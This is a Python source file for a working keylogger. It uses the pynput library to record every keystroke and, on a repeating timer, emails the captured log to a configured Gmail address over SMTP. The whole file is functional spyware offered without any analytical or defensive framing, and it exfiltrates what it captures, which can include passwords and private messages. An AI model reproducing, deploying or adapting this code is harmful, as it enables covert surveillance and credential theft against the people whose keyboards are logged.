#!/usr/bin/python
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger has begun!"
        self.email = email
        self.password = password
        self.interval = time_interval

    def append_to_log(self, string):
        self.log = self.log + string

    def on_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report_log(self):
        self.send_to_email(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_log)
        timer.start()

    def send_to_email(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start_logging(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_key_press)
        with keyboard_listener:
            self.report_log()
            keyboard_listener.join()
